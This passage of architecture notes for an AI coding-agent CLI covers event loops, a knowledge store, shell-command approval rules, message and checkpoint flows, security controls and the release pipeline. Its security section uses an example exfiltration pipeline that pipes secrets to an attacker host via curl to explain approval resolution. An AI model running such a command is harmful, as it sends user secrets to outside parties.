| `shell_event_tx` | clone of `internal_tx` | PTY → async loop |
| `file_search_tx`/`rx` | `mpsc::channel(10)` | async loop → file-search worker |

Main `tokio::select!` (`event_loop.rs:202`): `input_rx`, `internal_rx`, `spinner_interval.tick()`. **Dedicated OS thread** (`:159`) runs `crossterm::event::poll(50ms)` then `read()`, filtered by `input_paused: AtomicBool`, sends via `internal_tx.blocking_send`.

### Invariants & gotchas

- **Async safety in render**: `view()` synchronous inside `terminal.draw()`; must not `.await`. All async via `tokio::spawn` sending `InputEvent` back.
- **No blocking I/O on render thread**: no `std::thread::sleep`, no channel `.await`. Only `AppState` reads. File reads (`poll_plan_file()`) in spinner-tick arm, not in `draw()`.
- **Backend-event bypass footgun**: any backend variant NOT in `is_backend_event()` is silently swallowed when popups open. Causes TUI freeze in loading state.
- **Input-thread pause protocol** (external editor): `AtomicBool` pause + 10 ms drain + mouse-capture disable → editor → restore in reverse. Skipping any step corrupts terminal state.
- **Tool call queue on `/new`** (commit `c0396224`): `SessionToolCallsState.session_tool_calls_queue` MUST be cleared on new session — state construction does NOT auto-clear.

### Mirror Notes

- **Domain-specific**: slash-command content (`services/commands.rs`, `custom_commands.rs`); plan-mode lifecycle; board-task side panel; auto-approve policy engine; secret redaction `SecretManager`; rulebook/profile switcher popups; markdown/syntax highlighting/bash blocks.
- **Framework**: dual-channel contract — THE load-bearing seam; `is_backend_event()` bypass; separate OS thread w/ `AtomicBool` pause; `LoadingStateManager` set-based tracking (prevents premature spinner dismissal); `VecDeque<PendingUserMessage>` queue; scroll-written-in-render pattern.
- **Seams**: replace ratatui by swapping `view()` and `services/` render fns — `AppState` is UI-framework-agnostic. Replace crossterm by swapping `map_crossterm_event_to_input_event` + the OS thread. Replace PTY by swapping `ShellEvent` enum + `run_pty_command`. **Swap backend by replacing the consumer/producer of the two mpsc channels** — TUI has zero direct calls into agent layer.

---

## 17. `stakpak-ak` + `stakpak-shell-tool-approvals`

### `stakpak-ak` (knowledge store)

Local file-backed persistent knowledge store surviving across sessions. Pure library; no daemon. Consumed by `stakpak ak {search,read,write,remove,skill}`, which agents invoke via shell tool calls.

#### Storage layout

Root: `~/.stakpak/knowledge` (overridable via `AK_STORE` env). All paths strictly relative — `..`, `/`, drive prefixes rejected at parse (`store.rs:139`). Symlinks anywhere → immediate `Error::UnsafePath` (`:148`). Dotfiles silently excluded from listing/walk.

Files are markdown. **Conventional YAML frontmatter** (not enforced):
- `description` (used in `extract_description` at `format.rs:57`)
- `sources` — list of `{ session, checkpoint, captured_at, message_range? }`, required by retrospect skill
- `tags` (free-form)

Listing sorts: directories before files, alphabetic. On `remove`, empty parent directories pruned automatically.

#### Public API

- `StorageBackend` trait — `create`, `overwrite`, `read`, `read_prefix`, `remove`, `list`, `tree`, `walk`, `exists`
- `LocalFsBackend` — only concrete impl
- `Entry`, `TreeNode`, `GrepResult`, `PeekResult`
- `SearchEngine` trait + `TreeNavEngine<T>` (façade)
- `format::{parse_frontmatter, extract_description, extract_peek}`
- `skills::{SKILL_USAGE, SKILL_RETROSPECT, SKILL_MAINTAIN}` — byte-exact `include_str!` constants

#### Search

`TreeNavEngine<T>` wraps any `StorageBackend`. Always begins with `store.walk(path)` to collect sorted relative paths. Four modes:

- `search_default` → `PeekResult` per file (frontmatter raw + first body paragraph)
- `search_glob` → same peek, filtered by `globset::GlobMatcher` w/ `literal_separator: true`
- `search_grep` → matching lines + 1-based line numbers via `grep_regex::RegexMatcher`. Binary detected by NUL scan in first 8 KB, skipped.
- `search_grep_glob` → composes both

Regex compiled per call (no caching). `line_terminator(b'\n')` set, so patterns match within single lines.

#### `ak skill` mechanism

Skills are versioned markdown files **embedded at compile time** as `&'static str` constants via `include_str!`. They live in the binary, not the knowledge store.

`stakpak ak skill retrospect` prints `SKILL_RETROSPECT` (= `libs/ak/src/skills/retrospect.v1.md`). This is a **multi-step agent prompt**, not data. When piped into `autopilot schedule add --prompt "..."`, the scheduled agent receives the full text as system-level instructions. The prompt: call `stakpak ak skill usage` first → scan existing entries for already-cited session UUIDs → triage candidate sessions newest-first → extract durable facts with mandatory YAML source citations → write/update entries with `--force` → run `stakpak ak skill maintain`.

Critically, the prompt **forbids a fixed extraction taxonomy** — directs agent to use existing AK entries as live reference (`retrospect.v1.md:65-66`).

`skills.rs` tests enforce contract byte-for-byte with golden files.

### `stakpak-shell-tool-approvals`

#### Purpose

Sub-tool-level approval decisions for shell commands. Rather than approving `run_command` wholesale, parses the command string with **tree-sitter-bash**, extracts each command, walks a hierarchical scope-resolution rule map.

#### Public API

- `matches_pattern(pattern, arg) -> bool`
- `parse(input) -> Vec<ParsedCommand>` and `parse_with_status(input) -> Result<Vec<ParsedCommand>, ParseError>`
- `resolve_hierarchical_policy<T>(...) -> Result<Option<T>, ParseError>`

#### Hierarchical scope resolution

`resolve_hierarchical_policy` (`resolver.rs:16`) takes:
- `command_str` — raw shell string
- `primary_scope` — tool name (e.g. `"run_command"`)
- `fallback_scopes` — sibling scopes consulted if primary fires nothing
- `rules: &HashMap<String, T>` — flat map of `::`-delimited scope keys
- `default: T` — fallback policy

**Rule key syntax**: `<scope>[::<command>[::<arg_segment>...]]`

**Resolution priority within a scope, per command**:
1. **Arg-level match** — key prefix `scope::cmd::` with remaining `::` segments matched positionally against `cmd.args` via `matches_pattern`. Multiple arg-level rules → `max()` (most restrictive) wins.
2. **Command-level** — key `scope::cmd` exactly.
3. **Scope-level** — key `scope` exactly.

Rule segments form a **prefix**, not exact match: `run_command::stakpak::ak` fires for `stakpak ak write notes.md` because `ak` is a prefix of args.

**Across multiple parsed commands** in one shell script: `max()` wins across whole set. **Across scopes**: first scope with any match terminates search.

#### Pattern matching (`matcher.rs:30`)

- `re:<regex>` prefix → `regex::Regex`, compiled once and cached in process-global `OnceLock<Mutex<PatternCache>>`
- Contains `*`, `?`, or `[` → `globset::GlobMatcher`, same cache
- Else → exact equality

Invalid patterns log warning and return `false` (silently ignored).

#### Integration point

Sole caller: `tui/src/services/auto_approve.rs:486 resolve_shell_scope`. Extracts `command` from tool-call JSON args, picks primary scope from tool name (`SHELL_TOOLS = ["run_command", "run_command_task", "run_remote_command", "run_remote_command_task"]`), invokes `resolve_hierarchical_policy`. **On `ParseError`, falls back conservatively**: scope-level rule or default, clamped to ≥ `Prompt`.

#### tree-sitter-bash usage (`parse.rs`)

`parse_with_status` (`:63`) creates one `tree_sitter::Parser`, iterates `(script, depth)` work queue. Per script: full tree parse + iterative DFS. Only `"command"` nodes extracted.

`extract_command_from_node` (`:113`) classifies child nodes:
- `command_name` → name; if first child is `simple_expansion`/`expansion` (e.g. `$CMD`), name = `None`
- `file_redirect`, `heredoc_redirect`, `herestring_redirect`, `comment` → **skipped**
- Else after name → arg via `extract_word_text`

`extract_word_text`: handles `string` (double-quoted, strip quotes), `raw_string` (single-quoted), `concatenation` (recursive), `simple_expansion`/`expansion` (preserved as `$VAR`), else raw.

`extract_nested_script` (`:217`) detects shell-in-shell: command name in `SHELLS = ["sh","bash","zsh","fish","dash","ksh","tcsh","csh"]` + `-c` flag → next arg re-enqueued at `depth+1`. `env` and `xargs` launchers also unwrapped via `ENV_VALUED_ARGS`/`XARGS_VALUED_FLAGS` flag tables. **Max nesting depth = 5** → `Err(ParseError::NestingLimitExceeded)`.

Edge cases:
- Redirections (`>`, `<`, `>>`, `2>&1`) discarded at node level
- Heredocs (`<<EOF`) recognised as `heredoc_redirect`, skipped
- Backticks parsed as nested commands, naturally appear in DFS
- Variable-expansion command names → `name = None` (cannot match named rule)
- `offset = node.start_byte()` preserved for diagnostics

### Invariants & gotchas

- **AK file ownership**: no file locking. `create` checks existence before writing but **not atomic**. Concurrent writers can corrupt. Single-user/single-process assumption.
- **Shell parsing failure modes**: `ParseError::ParserUnavailable` (tree-sitter language load) or `NestingLimitExceeded`. If tree-sitter returns `None` for a script, silently skipped. Caller in `auto_approve.rs` clamps all `ParseError` to ≥ `Prompt` — **failure closed toward requiring approval**.
- **Allowlist/denylist semantics**: `AutoApprovePolicy` = `Auto(0) < Prompt(1) < Never(2)`. `max()` across all commands. **Any command with `Never`/`Prompt` overrides `Auto` on others in same pipeline.** System is structurally a **denylist overlay on top of an allowlist**.

### Mirror Notes

- **Domain-specific**: AK store layout (markdown + YAML `sources:` citations + `session`/`checkpoint` fields); skill orchestration pattern (skills as compile-time `&'static str` prompts).
- **Framework**: shell approval mechanism is purely mechanical — `HashMap<String, T>` keyed by `::`-delimited scope strings, resolved against `Vec<ParsedCommand>` from tree-sitter. **Completely reusable**. `T: Clone + Ord` bound means policy enum is caller-supplied.
- **Seams**: `StorageBackend` (swap `LocalFsBackend` for remote/encrypted backend); `rules: HashMap<String, T>` (load from JSON/TOML w/o touching resolver); tree-sitter parsing is independently replaceable — `ParsedCommand` is a simple struct.

---

# PART IV — CROSS-CUTTING FLOWS

These are the data paths a feature change is most likely to ripple along. Each is summarised file:line precisely so you can step through it with grep.

## 18. Message conversion pipeline (full chain)

```
User input / Tool results
    │
    ▼
Vec<ChatMessage>                          (cli/agent/run/mode_interactive.rs)
                                           OpenAI-shaped storage format
    │
    │  sanitize_tool_results() — three-part safety, see §14
    │
    ▼
ContextManager::reduce_context()           (libs/api/src/local/context_managers/)
    │
    │  merge_consecutive_same_role()       (Anthropic correctness)
    │  dedup_tool_results()                 (per tool_call_id)
    │  reduce_context_with_budget()         (TaskBoard variant only)
    │     ↳ trim_message → "[trimmed]" placeholder
    │     ↳ trimmed_up_to_message_index monotonic in metadata
    │
    ▼
Vec<LLMMessage>                           (libs/shared/src/models/llm.rs)
                                           Provider-neutral, typed content parts
    │
    │  to_stakai_message()                 (libs/shared/src/models/stakai_adapter.rs:24)
    │
    ▼
Vec<stakai::Message>                      (libs/ai/src/types/message.rs)
                                           Internal SDK format
    │
    │  Provider-specific build_*_request()
    │
    ├─► Anthropic: build_messages_with_caching()  (libs/ai/src/providers/anthropic/convert.rs:368)
    │     5-phase pipeline:
    │       1. convert each individually
    │       2. merge consecutive same-role
    │       3. per-message sanitisation
    │       4. sequence sanitisation (tool_use/tool_result pairing)
    │       5. tail cache breakpoints
    │     → Vec<AnthropicMessage>
    │
    ├─► OpenAI: to_openai_request()
    │     reasoning models: temperature=None, system→developer
    │     stream_options: include_usage: true
    │     → Vec<OpenAiMessage>
    │
    └─► Gemini: to_gemini_request()
          system → separate `system_instruction` field
          tool mode: "AUTO"|"NONE"|"ANY"
          thought_signature preserved as metadata
          → GeminiRequest
```

**Three places this can break**:
1. New `ChatMessage` field forgotten in `LLMMessage::from(ChatMessage)` impl
2. New `LLMMessageTypedContent` variant forgotten in `to_stakai_message()` or in any provider's `convert.rs`
3. Anthropic's strict pairing — adding a `ToolCall` part without ensuring next message has matching `ToolResult` triggers 400. Both `agent-core::context.rs::strip_dangling_tool_calls` and CLI's `has_pending_tool_calls` gate prevent this.

## 19. Agent run lifecycle (one turn end-to-end, server path)

```
Client POST /v1/sessions/{id}/messages with stakai::Message
    │
    ▼
routes.rs::send_message_handler
    ├─ idempotency::lookup → Proceed | Replay | Conflict
    ├─ run_overrides merge (caller > checkpoint metadata > AppState defaults > catalog[0])
    └─ session_manager.start_run(session_id, run_id) → atomic FSM transition Idle → Starting
                                                              │
                                                              ▼
                                              session_actor::spawn_session_actor
                                                    ├─ creates SessionHandle (mpsc + cancel token)
                                                    ├─ tokio::spawn(run_session_actor)
                                                    └─ returns handle synchronously
                                                              │
                                                              ▼
                                                     run_session_actor (async)
                                                         ├─ checkpoint_store.load_latest()
                                                         ├─   fallback session_store.get_active_checkpoint
                                                         ├─ message_bridge::chat_to_stakai
                                                         ├─ build SessionContext (env, AGENTS.md, skills)
                                                         ├─ tools = current_mcp_tools().snapshot()
                                                         ├─ build AgentConfig
                                                         ├─ start periodic checkpoint task (5s)
                                                         │
                                                         ▼
                                                 agent_core::run_agent(config, ctx, tools, hooks, exec, ...)
                                                         │
                                                  See §8 for the full per-turn loop:
                                                    reduce_context → before_inference hook
                                                    → inference.generate → parse text/tool_calls
                                                    → ApprovalStateMachine.next_ready
                                                    → ToolExecutor.execute_tool_call
                                                    → after_tool_execution hook
                                                    → loop until max_turns / cancel / completion
                                                         │
                                                  AgentEvent stream → events.publish(session_id, event)
                                                         │
                                                  EventLog ring buffer + broadcast::Sender
                                                         │
                                                  GET /v1/sessions/{id}/events (SSE):
                                                    subscribe(after_id from Last-Event-ID)
                                                    → replay (or GapDetected)
                                                    → live broadcast
                                                         │
                                                  run completes → mark_run_finished(Ok|Err)
                                                  FSM: Running → Idle (or Failed)
```

## 20. Tool call lifecycle (kernel-level, agent-core)

```
Inference returns assistant content with proposed_tool_calls = [A, B, C]
    │
    ▼
emit ToolCallsProposed
emit WaitingForToolApproval
    │
    ▼
ApprovalStateMachine::new(proposals, policy)
    ├─ For each: policy.action_for(tool_name)
    │     Approve → Ready(Accept)        ← auto-approved by policy
    │     Deny    → Ready(Reject)        ← auto-rejected by policy
    │     Ask     → PendingUserDecision  ← needs external resolve
    │
    ▼
loop {
   if cancel → append CANCELLED placeholders, return Cancelled
   if steering queue has items → append SkippedDueToSteering, return Completed
   match approvals.next_ready():
       ├─ Accept(call) →
       │     emit ToolExecutionStarted
       │     hooks.before_tool_execution
       │     tools.execute_tool_call(run, call, cancel)
       │       ├─ Completed{result} → append ToolResult, emit ToolExecutionCompleted, hooks.after
       │       └─ Cancelled → append "TOOL_CALL_CANCELLED", append remaining cancelled, return Cancelled
       ├─ Reject → append "Tool call rejected", emit ToolRejected
       ├─ CustomResult{content} → append content, emit ToolExecutionCompleted
       └─ None →
            if approvals.is_complete() → return Completed
            blocking command_rx.recv():
                ResolveTool / ResolveTools → apply to FSM
                Steering / FollowUp / SwitchModel / Cancel → queue/apply
   drain_runtime_commands_nonblocking
}
```

**`ApprovalStateMachine.next_ready()` invariant**: scans from `next_index`, **stops at first PendingUserDecision**. Out-of-order resolutions (id 2 before id 1) are stored in `Ready` but cannot overtake. This guarantees declaration-order execution while allowing user to approve tools in any order.

## 21. Streaming SSE assembly (two layers)

**Layer 1 — provider-native SSE → `StreamEvent` (libs/ai)**

Each provider has its own SSE parser:
- **Anthropic** (`stream.rs:30`): `HashMap<u32, ContentBlock>` keyed by `content_block_start.index`. Tool ID arrives in `content_block_start`. `ToolCallEnd` emitted at `content_block_stop`. `thinking_delta` → `ReasoningDelta`.
- **OpenAI** (`stream.rs:35`): `HashMap<u32, ToolCallState>`. Tool ID on first chunk per index, `id: None` after. `ToolCallEnd` only when `finish_reason == "tool_calls"`. `stream_options.include_usage` injected for usage in final chunk.
- **Gemini** (`stream.rs:15`): manual byte-level parsing of `data: {json}` lines (no `reqwest-eventsource`). `thought_signature` preserved as `metadata` on `ToolCallEnd`.

Output: `Stream<Item = Result<StreamEvent>>` — uniform regardless of provider.

**Layer 2 — `IndexedStreamEvent` → `Vec<OrderedContentPart>` (agent-core)**

`assemble_ordered_content` (`stream.rs:145`) uses `BTreeMap<usize, ContentSlot>` keyed by `content_index`. **BTreeMap → sorted iteration → output is content-index-ordered regardless of arrival order.** Type mismatch at same index → `ContentTypeMismatch`. Tool args buffered as strings, parsed as JSON only at `ToolCallEnd` (or end-of-stream). Empty arg buffers → `Value::Object({})`.

**Layer 3 — TUI streaming (CLI runtime)**

`ToolCallAccumulator` (`stream.rs:24`) merges deltas in `process_responses_stream`. Forwarded as `InputEvent::StreamAssistantMessage`, `StreamToolCallProgress`, `StreamUsage`, `StreamModel`. After stream end, `into_tool_calls()` filters placeholders.

## 22. Checkpoint and resume

**Persist** (every API call → runtime checkpoint):

```
session_actor::ServerCheckpointHook::after_inference / after_tool_execution / on_error
    │
    ▼
CheckpointRuntime.update(messages_snapshot, metadata)
    │
   (every 5s if dirty)
    │
    ▼
checkpoint_store::save_latest(envelope)
    │
    ▼
$HOME/.stakpak/server/checkpoints/{session_id}/latest.checkpoint.tmp
    └─ atomic rename → latest.checkpoint
    │
    ▼  (also)
session_store::create_checkpoint (libsql/SQLite or remote)
    └─ returned checkpoint_id stored in envelope.metadata
```

**Resume** (server path):

```
POST /v1/sessions/{id}/messages → session_actor boots
    ├─ checkpoint_store.load_latest($HOME/.stakpak/server/checkpoints/...)
    │     OR fallback session_store.get_active_checkpoint
    └─ deserialize_checkpoint
        ├─ version field present? → validate matches V1
        └─ absent → migrate_legacy_checkpoint
              ├─ try bare Vec<Message>
              └─ try { run_id, messages, metadata } shape
    → CheckpointEnvelopeV1 { messages, metadata }
    → message_bridge::chat_to_stakai (only if storage was ChatMessage shape)
    → build AgentConfig, run_agent(...)
```

**Resume** (CLI interactive): see §14 — `extract_checkpoint_messages_and_tool_calls` replays via `InputEvent`, returns `(messages, pending_tool_calls)`. Pending = tool_calls in last assistant minus already-resolved Role::Tool.

**`metadata` round-trip discipline**: opaque `serde_json::Value` from server, never modified client-side. Carries `trimmed_up_to_message_index` (cache-stable trim boundary), `active_model`, `session_id`, `checkpoint_id`. Each API request echoes back the last received metadata.

## 23. Context trimming with cache preservation

```
TaskBoardContextHook::before_inference fires
    │
    ▼
TaskBoardContextManager::reduce_context_with_budget(messages, context_window, metadata, tools)
    │
    ├─ clean_checkpoint_tags     # strip <checkpoint_id>...</checkpoint_id> XML
    ├─ ChatMessage → LLMMessage  # via From impl
    ├─ merge_consecutive_same_role  # Anthropic correctness for tool messages
    ├─ dedup_tool_results        # per tool_call_id
    │
    ├─ prev_trim_idx = metadata["trimmed_up_to_message_index"].as_u64()
    │
    ├─ # Re-apply previous trim boundary (cache stability)
    ├─ for i in 0..prev_trim_idx:
    │     trim_message(&mut messages[i])  # text → "[trimmed]", tool_result → "[trimmed]"
    │
    ├─ # Estimate; advance only if over budget
    ├─ tokens = estimate_tokens(messages) + estimate_tool_overhead(tools)
    ├─ threshold = context_window * 0.8 * 0.75  # safety factor below threshold
    ├─ if tokens > threshold:
    │     candidate = prev_trim_idx
    │     while candidate < (messages.len() - keep_last_n) AND tokens > threshold:
    │         if messages[candidate].role in {Assistant, Tool}:
    │             trim_message(&mut messages[candidate])
    │             tokens = estimate_tokens(messages) + ...
    │         candidate += 1
    │     metadata["trimmed_up_to_message_index"] = candidate.max(prev_trim_idx)
    │
    └─ Vec<LLMMessage>
```

**Two invariants**:
1. **Trim boundary monotonically non-decreasing** — never retreats. `metadata["trimmed_up_to_message_index"] = candidate.max(prev_trim_idx)`. Anthropic prompt cache prefix stays valid across turns.
2. **System and User messages never trimmed** — `BudgetAwareContextReducer` skips them at `:183, :199`.

## 24. Inbound message → reply (gateway)

```
Slack/Telegram/Discord platform fires event
    │
    ▼
Channel::start (per-platform impl) decodes → InboundMessage
    │
    ▼  inbound_tx (mpsc<InboundMessage>, cap 512)
Dispatcher::run loop
    │
    ├─ approval_response? → handle_approval_response
    │     resolve pending_approvals[session_id]
    │     POST /v1/sessions/{id}/tools/decisions
    │     resume run
    │
    └─ regular message:
       ├─ resolve_routing_key(channel, peer_id, chat_type)
       │     # produces stable key like "slack:thread:C123:1700.1"
       ├─ pop_delivery_context (one-shot, optional caller_context)
       ├─ store.get(routing_key) → existing session?
       │     ├─ yes: update_delivery (refresh channel_meta + updated_at)
       │     └─ no:  client.create_session(title) → store.set(...)
       │
       ├─ is_run_active(session_id)?
       │     ├─ yes: enqueue_message + reject_pending_approval if any
       │     └─ no:  start_run
       │           ├─ build_run_overrides (profile > channel > global)
       │           ├─ client.send_messages → run_id
       │           └─ spawn_run_consumer
       │                  └─ consume_run_events (SSE w/ Last-Event-ID resume)
       │                        ├─ text_delta → buffer → flush → channel.send
       │                        ├─ tool_calls_proposed → resolve via approval policy
       │                        │     AllowAll → auto-accept all
       │                        │     DenyAll → auto-reject all
       │                        │     Allowlist → split: listed auto-accept, rest → ApprovalNeeded
       │                        ├─ run_completed → RunOutcome::Completed
       │                        └─ run_error → RunOutcome::Error
       │     handle_run_result
       │           ├─ ApprovalNeeded → channel.send_with_buttons(prompt)
       │           │     store pending_approvals[session_id]
       │           │     pause (wait for approval_response inbound)
       │           ├─ Completed/Cancelled → drain_queue
       │           └─ Error → drain_queue
       │
       └─ drain_queue: collapse all queued messages into one combined text → start_run
```

## 25. MCP request path (CLI runtime)

```
Tool call in agent loop → run_tool_call → mcp_client.call_tool(params, metadata)
    │
    ▼
PeerRequestOptions { Meta(metadata) } → ClientRequest::CallToolRequest
    │
    ▼  HTTPS+mTLS or stdio
Local proxy server (started by mcp_init in same process)
    │
    ▼
ProxyServer::call_tool
    ├─ prepare_tool_params (restore_secrets_in_json_value)
    │     # walks JSON tree, replaces [REDACTED_SECRET:...] tokens with originals
    │     # single-pass: prevents chain substitution
    ├─ parse_tool_name → (client_name, original_tool_name)
    ├─ pool.get_or_init(client_name) → upstream MCP connection (lazy)
    │
    ▼
Upstream MCP server (local stakpak-mcp-server, remote stakpak/paks, or external)
    │
    ▼  CallToolResult
ProxyServer::call_tool (returning)
    ├─ redact_content (each text Content)
    │     secret_manager.redact_and_store_secrets
    │     → in-place replace with [REDACTED_SECRET:rule:6char] tokens
    │     → token → original mapping persisted in .stakpak/session/secrets.json
    └─ generate_password output force-redacted as password entry
    │
    ▼
Back to agent loop → push tool_result onto messages
```

---

# PART V — SECURITY MODEL

## 26. mTLS — ephemeral in-memory CA

`libs/shared/src/cert_utils.rs` — `CertificateChain::generate()` (`:29`):

1. Uses `rcgen` to create an in-process CA
2. Issues server cert with SANs = `localhost`, `0.0.0.0`, `127.0.0.1`
3. Issues client cert
4. **All keys held in memory only — never written to disk**
5. Validity = 365 days (process won't live that long anyway; certs are regenerated each startup)

Server side (`libs/mcp/server/src/lib.rs:291`): when `certificate_chain` is provided, switches Axum to `axum_server::from_tcp_rustls`. Client side (`libs/mcp/client/src/lib.rs:26`): uses `cert_chain.create_client_config()` for mutual auth. Both sides verify against the same CA.

`mcp_init.rs` (CLI runtime) generates **two** chains: one for server-proxy, one for proxy-client. Two free TCP ports allocated via `network::find_available_bind_address_with_listener()`.

**Disabling**: `--disable-mcp-mtls` falls back to `rustls_platform_verifier` (system CA store). Documented as not for production — widens trust to any HTTPS-reachable server.

## 27. Secret detection / redaction

Entry point: `redact_secrets(content, path, old_redaction_map, privacy_mode)` at `libs/shared/src/secrets/mod.rs:36`.

### Detection rules

| Rule set | File | Activated by |
|---|---|---|
| `gitleaks.toml` | upstream gitleaks | always (default) |
| `additional_rules.toml` | Stakpak custom | always |
| `privacy_rules.toml` | IPs, AWS account IDs | `--privacy-mode` only |

Per rule: regex + optional Shannon entropy ≥ 3.5 bits + keyword pre-filter + per-rule allowlist. **Deduplication: longest match wins on overlap.** Branch `feat/gitleaks-rules` and `feat/huawei-secrets-detection` extend the rule set.

### Token shape

`[REDACTED_SECRET:rule_id:6char_id]` — stable across calls because the redaction map (`HashMap<token, original_value>`) is **accumulated** via `old_redaction_map`. Same secret seen again gets same token → keeps Anthropic prompt cache valid.

### Persistence

`SecretManager` (`secret_manager.rs:9`) holds the map; persists to `{session_dir}/secrets.json` via `LocalStore`. Survives crashes; cleared at session end.

### Apply at proxy boundary

The MCP **proxy** is the redaction point — not the server. Two functions:

- **Outbound (response → LLM)** — `redact_content` in `proxy/src/server/mod.rs:352`. Every text `Content` in `CallToolResult` runs through `secret_manager.redact_and_store_secrets()`.
- **Inbound (request → tool)** — `prepare_tool_params` in `:282`. Walks JSON tree via `restore_secrets_in_json_value` (`:104`); replaces `[REDACTED_SECRET:...]` tokens with originals **in a single pass** to prevent chain substitution.

**Force-redaction**: `generate_password` tool output is always redacted as a password entry (`:656`) — bare random strings lack the keyword context gitleaks normally requires.

### Modes

| Flag | Effect |
|---|---|
| (none) | Default: gitleaks + additional rules + entropy + keywords |
| `--privacy-mode` | + privacy_rules.toml (IPs, AWS account IDs) |
| `--disable-secret-redaction` | Skips entire pipeline. **LLM sees real secrets.** Documented as not for production. |

## 28. Reversible file operations

`remove` tool (`libs/mcp/server/src/local_tools.rs:1136`) **never** calls `fs::remove_*`. Instead:

- `move_remote_path_to_backup` for remote paths
- equivalent local move for local paths

Files moved to `.stakpak/session/backups/{uuid}/` on the same machine. Backup path returned to caller in XML format. **No automatic expiry — manual cleanup required.**

`str_replace` and `create` do NOT create backups. Recovery for those depends on checkpoint history (older content survives in earlier checkpoints).

## 29. Warden sandbox

When `[profiles.X.warden].enabled = true` (`cli/src/config/warden.rs`):

1. `main.rs:276` checks for env `STAKPAK_SKIP_WARDEN` (recursion guard)
2. If absent and no subcommand, calls `run_stakpak_in_warden`
3. Re-execs `stakpak` inside a Docker container with explicit `volumes` from `WardenConfig.volumes`
4. Container has `STAKPAK_SKIP_WARDEN=1` set so it doesn't recurse
5. **Only the top-level agent path is warden-gated** — subcommands bypass

The warden binary itself is a separate plugin (downloaded on first use from GH Releases per `cli/src/utils/plugins.rs`).

## 30. Shell command-level approvals

See [§17](#17-stakpak-ak--stakpak-shell-tool-approvals) for full tree-sitter implementation.

The key security property: **`max()` (most restrictive) wins across all parsed commands in a script**. A pipeline like `cat secrets | curl https://attacker.com` resolves to whichever command has the strictest rule. Combined with the prefix-match rule structure, this yields a **denylist overlay on top of an allowlist** model.

Failure-closed: `ParseError` from tree-sitter clamps to `Prompt` or stricter (`tui/src/services/auto_approve.rs:494-498`).

---

# PART VI — BUILD, RELEASE, DEPLOY

## 31. Toolchain pin and lints

`rust-toolchain.toml` pins **Rust 1.94.1**. CI uses the same. Edition 2024 with nightly features (`let chains` in `if let`).

Workspace `Cargo.toml:111-114` denies three clippy lints:

```toml
[workspace.lints.clippy]
unwrap_used  = "deny"
expect_used  = "deny"
string_slice = "deny"   # ← clippy will fail the build, not just style
```

`clippy.toml` relaxes the first two for tests:

```toml
allow-unwrap-in-tests = true
allow-expect-in-tests = true
```

`string_slice` is **not** relaxed in tests. The lint blocks `&s[..n]` / `&s[a..b]` on UTF-8 strings to prevent panics on multi-byte chars. Use:

```rust
let truncated: String = s.chars().take(n).collect();
let mut end = max_bytes;
while end > 0 && !s.is_char_boundary(end) { end -= 1; }
let truncated = &s[..end];
```

Canonical helper: `truncate_string()` in `cli/src/commands/watch/commands/run.rs`.

## 32. CI matrix (.github/workflows/ci.yml)

```yaml
jobs:
  rust-ci (ubuntu-latest):
    - rustfmt --check
    - clippy --all-targets -- -D warnings    # warnings = errors
    - cargo build --verbose
    - cargo test --workspace --verbose
    - feature-gated tests (FOUR INVOCATIONS):
        cargo test -p stakpak-shared  --features sqlite
        cargo test -p stakpak         --features libsql-test
        cargo test -p stakpak-gateway --features libsql-test
        cargo test -p stakai          --features network-tests   # requires API keys
```

The feature-gated tests are NOT covered by `cargo test --workspace`. If you change `shared/`, `gateway/`, the binary, or `ai/`, run them locally before pushing.

## 33. Release pipeline (.github/workflows/build-and-release.yml)

Triggered by:
- Push to `main` or `beta` → builds (no release)
- Tag `v*` → full release flow

```
setup (ubuntu-22.04):
  detect is_beta from tag (v1.2.3-beta.N → true)

build (matrix, 5 targets):
  - x86_64-unknown-linux-musl       (ubuntu-22.04, jemalloc feature)
  - aarch64-unknown-linux-musl      (ubuntu-22.04-arm, jemalloc, builds in Alpine container — Ubuntu's musl-gcc lacks C11 atomics for jemalloc+libsql on ARM)
  - x86_64-apple-darwin             (macos-15)
  - aarch64-apple-darwin            (macos-15)
  - x86_64-pc-windows-msvc          (windows-2022)

  each:
    - cargo build --release --target X $features
    - cargo test  --target X
    - jemalloc verification (linux-musl): nm $binary must NOT show " W malloc$"
      (otherwise SQLite SIGSEGVs on musl)
    - tar.gz / zip archive

release (only on tag):
  softprops/action-gh-release with all 5 artifacts

publish_crates_io (on tag):
  cargo login with CRATES_IO_TOKEN
  publish in dependency order:
    stakai → stakpak-shared → stakpak-api →
    stakpak-mcp-config → stakpak-mcp-client → stakpak-mcp-server → stakpak-mcp-proxy →
    stakpak-shell-tool-approvals → stakpak-ak →
    stakpak-agent-core → stakpak-gateway →
    stakpak-server → stakpak-tui → stakpak
  15s sleep between for crates.io index propagation
  "already uploaded" detected → skip not fail

docker (on tag):
  build/push ghcr.io/stakpak/agent:vX.Y.Z (and :latest if not beta)

update-release-notes (on tag):
  git-cliff $PREV_TAG..$TAG --strip all > release_notes.md
  gh release edit "$VERSION" --notes-file release_notes.md

homebrew (on stable tag only):
  pull stakpak/homebrew-stakpak repo
  download all 4 unix tarballs, sha256sum each
  generate stakpak.rb formula, commit, push
```

## 34. release.sh workflow

`release.sh` is a hand-driven version-bump tool used **before** tagging:

1. Parse args: `patch | minor | major | X.Y.Z` and optional `--beta`
2. Read current version from `Cargo.toml`
3. Compute new version (interactive if no arg)
4. For beta: append `-beta.N` where N = next number after existing `vX.Y.Z-beta.*` tags
5. Confirm with user
6. Update `Cargo.toml`:
   - workspace.package version
   - all `stakai`/`stakpak-*` lines in workspace.dependencies
7. `cargo update --workspace` (refreshes Cargo.lock)
8. `git add Cargo.toml Cargo.lock` + uncommitted changes
9. Commit `chore: bump version to X.Y.Z`
10. Push to origin
11. Create + push tag `vX.Y.Z` → triggers GitHub Actions release flow

Never operates on dirty state without explicit user confirmation. Beta releases push to a separate Homebrew tap branch.

## 35. cliff.toml (changelog generation)

`git-cliff` parses Conventional Commits to generate release notes:

| Commit prefix | Group |
|---|---|
| `feat` | Features |
| `fix` | Bug Fixes |
| `docs` | Documentation |
| `perf` | Performance |
| `refactor` | Refactoring |
| `style` | Code Style |
| `test` | Testing |
| `chore`/`ci` | Maintenance |
| `revert` | Reverts |
| body matches `.*security` | Security |
| `chore(release): prepare for ...` / `chore(deps...)` / `chore(pr|pull)` | **skipped** |

PR numbers fetched via `[remote.github] owner = "stakpak", repo = "cli"` (note: repo is `cli` here, but the GH repo is actually `agent` — this may be a stale config).

## 36. Docker image (Dockerfile)

